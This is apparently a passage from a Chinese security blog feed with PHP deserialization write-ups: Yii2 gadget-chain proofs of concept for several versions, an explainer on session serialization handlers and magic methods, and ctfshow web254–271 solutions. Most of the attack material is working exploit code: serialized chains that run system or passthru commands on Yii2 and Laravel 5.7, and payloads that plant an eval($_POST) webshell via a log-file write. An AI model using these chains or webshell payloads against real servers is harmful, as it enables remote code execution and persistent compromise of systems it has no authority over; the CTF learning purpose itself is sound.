&#125;&#125;?&gt;</code></pre><p>大佬们的poc：</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker &#123;    use yii\rest\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#39;close&#39;] = [new IndexAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader=new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><p>其他链子：</p><p>yiii 2.0.38</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><p>poc3</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;dir&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为render            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><p>yii 2.0.42</p><p>poc4</p><pre><code>&lt;?phpnamespace Faker;class DefaultGenerator&#123;    protected $default ;    function __construct($argv)    &#123;        $this-&gt;default = $argv;    &#125;&#125;class ValidGenerator&#123;    protected $generator;    protected $validator;    protected $maxRetries;    function __construct($command,$argv)    &#123;        $this-&gt;generator = new DefaultGenerator($argv);        $this-&gt;validator = $command;        $this-&gt;maxRetries = 99999999;    &#125;&#125;namespace Codeception\Extension;use Faker\ValidGenerator;class RunProcess&#123;    private $processes = [];    function __construct($command,$argv)    &#123;        $this-&gt;processes[] = new ValidGenerator($command,$argv);    &#125;&#125;$exp = new RunProcess(&#39;system&#39;,&#39;whoami&#39;);echo(base64_encode(serialize($exp)));</code></pre><p>poc5</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        function __construct()        &#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace Symfony\Component\String&#123;    use yii\rest\IndexAction;    class LazyString    &#123;        function __construct()        &#123;            $this-&gt;value = [new indexAction(), &quot;run&quot;];        &#125;    &#125;     class UnicodeString    &#123;        function __construct()        &#123;            $this-&gt;value = new LazyString();        &#125;    &#125;&#125;namespace Faker&#123;    use Symfony\Component\String\LazyString;    class DefaultGenerator    &#123;        function __construct()        &#123;            $this-&gt;default = new LazyString();        &#125;    &#125;    class UniqueGenerator    &#123;        function __construct()        &#123;            $this-&gt;generator = new DefaultGenerator();            $this-&gt;maxRetries = 99999999;        &#125;    &#125;&#125;namespace Codeception\Extension&#123;    use Faker\UniqueGenerator;    class RunProcess    &#123;        function __construct()        &#123;            $this-&gt;processes[] = new UniqueGenerator();        &#125;    &#125;&#125;namespace&#123;    use Codeception\Extension\RunProcess;    $exp = new RunProcess();    echo(base64_encode(serialize($exp)));&#125;</code></pre><p>yii 2.2.37</p><p>poc2</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;system&#39;;            $this-&gt;id = &#39;whoami&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> yii </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>php在session存储和读取时,都会有一个序列化和反序列化的过程,PHP内置了多种处理器用于存取<code>$_SESSION</code>数据,都会对数据序列化和反序列化,源码中有session_start的时候会读取session,从而进行反序列化.<br>php.ini 中默认 session.serialize_handler 为 php_serialize，而 index.php 中将其设置为 php ，这个差异就导致了 sesssion 反序列化问题。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>php有三种处理器对$_SESSION数据进行序列化和反序列化。</p><p>1、反序列化之后的内容为一个对象；</p><p>2、反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关；</p><p>3、反序列化不触发类的成员方法；需要调用方法后才能触发；</p><p> 常见魔术方法：</p><img src="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/205313.png" class=""><p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化对象时，首先会去自动执行的一个方法</td></tr><tr><td>__destruct()</td><td>在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法（实例化结束后以及反序列化时会触发）</td></tr><tr><td>__sleep()</td><td>序列化serialize()函数回显检查类中是否存在__sleep()，如果存在，该方法会先被调用，然后才执行序列化操作</td></tr><tr><td>__wakeup()</td><td>unserialize()之前会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup()方法</td></tr><tr><td>__tostring()</td><td>表达方式错误导致魔术方法触发（把对象当成字符串调用）</td></tr><tr><td>__invoke()</td><td>格式表达错误导致没魔术方法触发（把对象当成函数调用）</td></tr><tr><td>__call()</td><td>调用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__callStatic()</td><td>静态调用或调用成员常量时使用的方法不存在时触发（返回值：调用的不存在的方法的名称和参数）</td></tr><tr><td>__get()</td><td>调用的成员属性是私有属性或不存在时触发（返回值：不存在的成员属性的名称）</td></tr></tbody></table><table><thead><tr><th>函数</th><th>触发时机</th></tr></thead><tbody><tr><td>__set()</td><td>给不存在的成员属性赋值时触发（返回值：不存在的成员属性的名称和赋的值）</td></tr><tr><td>__isset()</td><td>对不可访问属性(私有的、受保护的或不存在的属性)使用isset()或empty()时，__isset()会被调用 （返回值：不存在的成员属性的名称）</td></tr><tr><td>__unset()</td><td>对不可访问属性使用unset()时触发（返回值：不存在的成员属性名称）</td></tr><tr><td>__clone()</td><td>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</td></tr><tr><td>__serialize()（此特性自 PHP 7.4.0 起可用。）</td><td>serialize()函数会检查类中是否存在一个魔术方法 __serialize() 。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键&#x2F;值 成对的关联数组形式来返回。注：如果类中同时定义了__serialize()和__sleep()两个魔术方法，则只有__seriallize()方法会被调用，__sleep()方法会被忽略</td></tr><tr><td>__unserialize()（此特性自 PHP 7.4.0 起可用。）</td><td>unserialize()检查是否存在具有名为__unserialize() 的魔术方法。注：如果类中同时定义了 __unserialize() 和 __wakeup()两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup()方法会被忽略。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化(ctfshow)</title>
      <link href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"/>
      <url>/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>这关好像和反序列化没什么关系</p><pre><code>payload ?username=xxxxxx&amp;password=xxxxxx</code></pre><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223653.png" class=""><p>这里让我们让反序列后的结果是ctfShowUser的实例化对象。又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());//O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;//由于cookie中将;作为截断符号，所需要编码绕过，这里采用url编码echo urlencode($a);//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>这关需要序列化一个username或password使其反序列化后互不相同就行了</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $username=&#39;haha&#39;;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());echo urlencode($a);?&gt;//运行结果O:11:&quot;ctfShowUser&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;haha&quot;;s:5:&quot;isVip&quot;;b:1;&#125;//url编码处理后：O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22haha%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><code>__construct</code>当对象被创建的时候自动调用，对对象进行初始化。当所有的操作执行完毕之后，需要释放序列化的对象，触发<code>__destruct()</code>魔术方法</p><p>因此我们只需要在执行<code>__construct</code>的时候初始化backDoor类，方便我们进行命令执行的利用，之后反序列化结束后，会执行<code>__destruct()</code>,此时<code>eval($this-&gt;code);</code>等价于<code>eval(system(&#39;cat flag.php&#39;);)</code></p><pre><code>&lt;?phperror_reporting(0);class ctfShowUser&#123;    private $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;    public function getInfo()&#123;        eval($code);    &#125;&#125;echo urlencode(serialize(new ctfShowUser()));?&gt;//要在输出时就要url编码，否则会遗漏掉空格</code></pre><p>最后生成反序列化的数据：</p><pre><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</code></pre><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>这关多了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code></p><p>只需要把O后面的数字前加个加号就可以绕过了（o:+数字:）</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125; &#125; class backDoor&#123;    public $code=&#39;system(&quot;cat f*&quot;);&#39;;&#125;$a = serialize(new ctfShowUser());$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);echo urlencode($a);?&gt;//运行结果O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:17:&quot;system(&quot;cat f*&quot;);&quot;;&#125;&#125;//URL处理O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</code></pre><h3 id="web259"><a href="#web259" class="headerlink" title="web259*"></a>web259*</h3><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p> 这题就简单了，直接序列化一个包含”ctfshow_i_love_36D”的字符串</p><pre><code>&lt;?phpclass ctf&#123;    public $c=&quot;ctfshow_i_love_36D&quot;;&#125;$a=serialize(new ctf());echo urlencode($a);</code></pre><pre><code>payload:ctfshow&#123;3d3ba94d-0c6c-4ae8-8113-b34d15d286b9&#125;</code></pre><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code>注意:如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。//此特性自 PHP 7.4.0 起可用。</code></pre><p><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p><pre><code>&lt;?phpclass ctfshowvip&#123;    public $username;    public $password=&#39;&#39;;    public $code=&#39;&#39;;            public function __construct()&#123;        $this-&gt;username=&#39;877.php&#39;;        $this-&gt;password=&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;                    &#125;    &#125;echo urlencode(serialize(new ctfshowvip()));?&gt;</code></pre><pre><code>payload: vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D</code></pre><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>方法1：非预期</p><p>因为message.php页面中的cookie我们是可控的，所以我们可以直接将序列化加密之后的字符串赋值给cookie即可。</p><pre><code>&lt;?php class message&#123;    public $token=&#39;admin&#39;;&#125;echo urlencode(base64_encode(serialize(new message(1,2,3))));</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223637.png" class=""><p>方法2：<strong>php反序列化字符串逃逸</strong></p><pre><code>字符串逃逸类似于注入，逃逸有一个特征：对序列化后的字符串进行了替换、而且替换后造成了字符数量的不一致，有两种情况，一种是替换后变长，一种是替换后变短。此题将fuck替换成了loveU，所以是变长。</code></pre><p>我们先看看这个：</p><pre><code>&lt;?phpclass message&#123;    public $from=&#39;1&#39;;    public $msg=&#39;2&#39;;    public $to=&#39;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;;&#125;echo urlencode(serialize(new message()));//结果解码后为O:7:&quot;message&quot;:3:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</code></pre><p>可以看到，这里的s:31:”fuck”中fuck应该是四个字符，而这里却是31个，因为这里的31个字符包含了后面的一堆字符<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>，共27个字符，而要使这里的数字于字符数对应，我们就可以用到题目给的字符串替换，将fuck替换成loveU,每替换一次就会多一个字符，不难想到，如果替换27次，那么就相当于这里将后面的常量字符串数量天衣无缝的弥补上了。</p><pre><code>payload:f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>最后访问message.php即可</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>用扫描器扫到了<a href="http://www.zip和check.php/">www.zip和check.php</a></p><p><a href="http://www.zip中的index.php/">www.zip中的index.php</a>:</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/205319.png" class=""><p>我们可以通过修改 <code>$COOKIE[&#39;limit&#39;]</code> 来控制 <code>session</code> 的内容。</p><p>inc&#x2F;inc.php:</p><pre><code>&lt;?php...ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();...class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;...</code></pre><p>我们需要知道session_start()这个函数已经这个函数所起的作用：</p><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p><p>这里使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p><pre><code>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值</code></pre><p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p><p>那么思路就很清晰了，首先在 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。</p><p>首先构造payload:</p><pre><code>&lt;?phpclass User&#123;    public $username = &quot;c.php&quot;;    public $password = &quot;&lt;?php @eval($_POST[1]); ?&gt;&quot;;    public $status;&#125;$a = new User();$target = &#39;|&#39;.serialize($a);var_dump(urlencode(base64_encode($target)));//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4iO3M6Njoic3RhdHVzIjtOO30%3D</code></pre><p>更改 <code>cookie</code> 后访问 <code>index.php</code>,然后访问check.php或inc&#x2F;inc.php进行反序列化，最后访问log-c.php传参即可</p><h3 id="web264-反序列化字符串逃逸"><a href="#web264-反序列化字符串逃逸" class="headerlink" title="web264 反序列化字符串逃逸"></a>web264 反序列化字符串逃逸</h3><p>与262关不同的是这里用的是session，所以不能非预期了</p><p>反序列化字符串逃逸：</p><pre><code>f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>访问message.php时还需要在cookie中添加msg，值任意</p><h3 id="web265-反序列化中指针引用"><a href="#web265-反序列化中指针引用" class="headerlink" title="web265 反序列化中指针引用"></a>web265 反序列化中指针引用</h3><p>token的值是一个随机值，我们要想传值给password，使其与token相等是不可能的，那么就只有把password的地址传给token，使password跟着token的改变而改变。</p><pre><code>&lt;?phpclass ctfshowAdmin&#123;    public $token=1;    public $password=1;&#125;$a = new ctfshowAdmin();$a-&gt;password=&amp;$a-&gt;token;//让passwd的值随token变echo serialize($a);//运行结果O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre><h3 id="web266-php不区分类名的大小写"><a href="#web266-php不区分类名的大小写" class="headerlink" title="web266 php不区分类名的大小写"></a>web266 php不区分类名的大小写</h3><p>php中：</p><pre><code>区分大小写的： 变量名、常量名、数组索引（键名key）不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</code></pre><p>所以这道题解法呼之欲出：因为正则表达式区分了大小写，所以我们可以使用大小写绕过，然后反序列化ctfshow类，这样就不会报错，脚本正常结束之后，就很调用__destruct()魔法方法，输出flag。</p><pre><code>&lt;?phpclass Ctfshow&#123;    &#125;echo serialize(new Ctfshow());//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/114148.png" class=""><h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><p>先用admin弱口令登录</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155148.png" class=""><p>在about页面发现提示?view-source</p><p>访问url&#x2F;?r&#x3D;site&#x2F;about&amp;view-source得到反序列化点</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/155604.png" class=""><p>POC:</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;tac /flag&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader = new Generator;        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;</code></pre><p>get传参，得到flag</p><pre><code>?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</code></pre><h3 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h3><p>这里需要换一条链子：</p><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;// poc2namespace Codeception\Extension&#123;    use Faker\Generator;    class RunProcess&#123;        private $processes;        public function __construct()        &#123;            $this-&gt;processes = [new Generator()];        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));&#125;?&gt;</code></pre><h3 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;ls&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            // 这里需要改为isRunning            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace phpDocumentor\Reflection\DocBlock\Tags&#123;    use Faker\Generator;    class See&#123;        protected $description;        public function __construct()        &#123;            $this-&gt;description = new Generator();        &#125;    &#125;&#125;namespace&#123;    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache&#123;        private $keys = [];        private $path;        public function __construct()        &#123;            $this-&gt;path = new See;            $this-&gt;keys = array(                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)            );        &#125;    &#125;    // 生成poc    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt;</code></pre><h3 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h3><pre><code>&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#39;passthru&#39;;            $this-&gt;id = &#39;cat /fl*&#39;;        &#125;    &#125;&#125;namespace yii\db&#123;    use yii\web\DbSession;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader=new DbSession();        &#125;    &#125;&#125;namespace yii\web&#123;    use yii\rest\IndexAction;    class DbSession    &#123;        public $writeCallback;        public function __construct()&#123;            $a=new IndexAction();            $this-&gt;writeCallback=[$a,&#39;run&#39;];        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><h3 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h3><p>laravel5.7反序列化</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;        protected $bindings = [];        public function __construct()&#123;            $this-&gt;bindings=array(                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;                )            );        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含(ctfshow)</title>
      <link href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"/>
      <url>/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/</url>
      
